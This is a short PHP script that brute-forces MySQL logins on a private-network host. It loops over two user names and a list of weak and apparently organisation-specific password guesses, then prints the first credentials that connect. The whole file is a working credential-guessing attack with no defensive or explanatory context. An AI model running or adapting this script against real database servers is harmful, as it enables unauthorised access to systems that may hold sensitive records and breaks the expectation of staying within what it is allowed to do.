<?php
$host = "192.168.100.88";
$users = ["sik", "root"];
$passwords = ["", "sik", "root", "admin", "123456", "1234", "12345", "12345678", "khanza", "luwakwhitecoffeegakbikinkembung", "kamus", "pahoman", "sikpahoman", "192.168.100.88"];

foreach ($users as $u) {
    foreach ($passwords as $p) {
        try {
            $pdo = new PDO("mysql:host=$host", $u, $p, [PDO::ATTR_TIMEOUT => 2, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
            echo "CONNECTED: User=$u Pass=$p\n";
            exit;
        } catch (Exception $e) {
            // failed
        }
    }
}
echo "FAILED_ALL\n";
